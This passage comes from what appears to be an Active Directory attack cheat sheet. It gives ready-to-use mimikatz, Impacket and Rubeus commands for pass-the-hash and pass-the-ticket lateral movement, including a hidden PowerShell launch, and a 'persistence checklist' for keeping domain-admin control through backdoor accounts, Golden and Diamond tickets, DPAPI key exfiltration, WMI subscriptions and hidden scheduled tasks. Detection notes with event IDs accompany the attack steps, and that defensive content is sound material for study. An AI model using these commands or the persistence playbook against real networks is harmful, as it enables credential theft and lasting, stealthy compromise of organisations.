> **Detection:** Event **4656** and **4663** (LSASS handle request and object access) when LSASS SACL auditing is enabled. Sysmon Event ID **10** (`ProcessAccess`) with `TargetImage lsass.exe` and high `GrantedAccess` values (e.g., `0x1fffff`, `0x1010`, `0x1438`). The `comsvcs.dll MiniDump` LOLBAS technique will appear in Sysmon as a `rundll32.exe` invocation with LSASS as the target — a high-confidence IOC. Credential Guard (Windows 10+) prevents LSASS from storing recoverable credential material for domain accounts.

---

## Pass-the-Hash (PTH) and Pass-the-Ticket (PTT)

**Pass-the-Hash:** Use an NTLM hash directly for authentication without knowing the plaintext password.

> **Required privileges:** Local Administrator (to use PTH for lateral movement to other machines). The hash itself can be obtained via LSASS dump or DCSync.

```
mimikatz # sekurlsa::pth /user:USERNAME /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe
```

Open a new shell in the context of the target user's credentials:

```
mimikatz # sekurlsa::pth /user:Administrator /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:"powershell.exe -w hidden"
```

Using Impacket tools from a Linux attack host for lateral movement:

```
impacket-psexec TARGET_DOMAIN/USERNAME@DC_IP -hashes :NTLM_HASH
impacket-wmiexec TARGET_DOMAIN/USERNAME@DC_IP -hashes :NTLM_HASH
impacket-smbexec TARGET_DOMAIN/USERNAME@DC_IP -hashes :NTLM_HASH
```

**Pass-the-Ticket:** Inject a Kerberos ticket (`.kirbi` or base64 blob) into the current session or a new logon session.

```
Rubeus.exe ptt /ticket:ticket.kirbi
```

Inject into a specific LUID (for clean credential separation):

```
Rubeus.exe createnetonly /program:C:\Windows\System32\cmd.exe /show
Rubeus.exe ptt /ticket:ticket.kirbi /luid:0x1234abc
```

Purge all tickets from current session:

```cmd
klist purge
```

> **Detection:** PTH generates Event **4624** with `LogonType 3` (network logon) and `AuthenticationPackageName NTLM` — this is the primary signal. PTT may generate Event **4768** or **4769** depending on the ticket type and how it was created. Anomalies include ticket use from unexpected hosts or accounts, mismatched source IP versus account home location, and NTLM authentication in environments that have migrated to Kerberos-only.

---

## Persistence Checklist

A summary of recommended persistence steps after achieving Domain Admin. Apply in layers — if one is detected, others remain viable.

```
[x] DCSync rights on BACKDOOR_USER          → Silent, no binary needed
[x] GenericAll on AdminSDHolder             → Auto-propagates every 60 min
[x] WriteDACL on domain root                → Can re-escalate on demand
[x] Golden Ticket (AES256, etype 18)        → Offline, no DC contact required
[x] Diamond Ticket                          → Harder to detect than Golden
[x] DPAPI Backup Key exfiltrated            → Persistent credential access
[x] WMI subscription on DC                 → Fileless, survives reboot
[x] Scheduled task (SYSTEM, hidden)         → Fallback callback mechanism
[x] SID history on BACKDOOR_USER           → Invisible group membership
[x] LSASS minidump saved offline            → Reuse hashes without re-dumping
```

---

> **Disclaimer:** For educational purposes only. Unauthorized access to computer systems is illegal.
